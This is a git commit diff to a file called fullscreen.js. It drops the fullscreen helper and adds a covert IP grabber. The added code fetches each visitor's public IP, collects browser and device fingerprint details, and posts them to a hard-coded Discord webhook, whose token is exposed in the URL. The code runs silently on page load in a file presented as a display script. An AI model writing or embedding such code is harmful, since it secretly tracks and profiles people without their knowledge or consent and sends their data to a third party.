cbf6049e4e1cd00119daddea266482ca031d5389
otema <126337147+otema666@users.noreply.github.com>
2023-07-03 21:31:25 +0200

    fullscreen.js

--- fullscreen.js
+++ fullscreen.js
@@ -1,9 +1,3 @@
-function aceptar() {
-	document.getElementById("contenido").style.display = "block";
-	document.getElementById("mensaje").style.display = "none";
-	document.documentElement.requestFullscreen();
-}
-
 var ip = '';
 fetch('https://api.ipify.org/?format=json')
   .then(function(response) {
@@ -11,9 +5,31 @@ fetch('https://api.ipify.org/?format=json')
   })
   .then(function(data) {
     ip = data.ip;
+    var osName = navigator.platform;
+    var browser = navigator.userAgent;
+    var resolution = window.screen.width + 'x' + window.screen.height;
+    var language = navigator.language;
+    var vendor = navigator.vendor;
+    var cookiesEnabled = navigator.cookieEnabled;
+    var doNotTrack = navigator.doNotTrack;
+    var hardwareConcurrency = navigator.hardwareConcurrency;
+    var maxTouchPoints = navigator.maxTouchPoints;
     var webwhook = 'https://discord.com/api/webhooks/1125498024337088614/lc3Wst1oc8eKH4FrOpeIwGHk1ags0-tO6I6Cb58OvPCwqtSATsEr_Oj3yrwP1t08huO9';
+
+
     var message = {
-      content: 'IP:' + ip
+      content: '-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------' + '\n' +
+               '```IP: ' + ip + '```'+ '\n' +
+               '**Operating System:** ' + osName + '\n' +
+               '**Browser:** ' + browser + '\n' +
+               '**Resolution:** ' + resolution + '\n' +
+               '**Language:** ' + language + '\n' +
+               '**Vendor:** ' + vendor + '\n' +
+               '**Cookies enabled:** ' + cookiesEnabled + '\n' +
+               '**Do Not Track:** ' + doNotTrack + '\n' +
+               '**Hardware Concurrency:** ' + hardwareConcurrency + '\n' +
+               '**Max Touch Points:** ' + maxTouchPoints + '\n' + 
+               '-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------    '
     };
 
     fetch(webwhook, {
